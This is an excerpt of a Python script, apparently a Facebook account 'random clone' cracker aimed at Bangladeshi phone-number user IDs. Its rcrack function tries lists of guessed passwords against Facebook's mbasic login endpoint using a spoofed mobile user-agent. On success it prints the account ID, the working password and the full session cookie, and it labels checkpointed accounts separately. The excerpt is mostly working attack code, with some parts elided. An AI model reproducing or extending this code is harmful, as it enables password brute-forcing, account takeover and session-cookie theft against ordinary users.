...
def fuck():
    ...
    print(logo)
    print("\033[38;5;46--------------------------------------------")
    print('\x1b[1;91m⧼ WORKING ⧽ :\x1b[1;92m BANGLADESH RANDOM CLONE ENJOY ')
    print("\033[38;5;46--------------------------------------------")
    print('\033[1;32m[+] SIM CODE BD=> 016 • 017 • 018 • 019 ETC')
    print("\033[38;5;46--------------------------------------------")
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
 		   ...
 		   'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Pixel C Build/OPM8.190605.005) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Safari/537.36 OPT/2.6',}
            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f"\033[38;5;46m[GS XD-OK] {uid} • {ps}" '  \n\033[1;33m [🍪]\033[1;33mCookie = \033[1;32m'+coki+  ' \n\033[1;33m [⚠️] \033[1;32mUa = \033[1;34m'+pro+'  \033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[GS XD-CP] {uid} • {ps}")
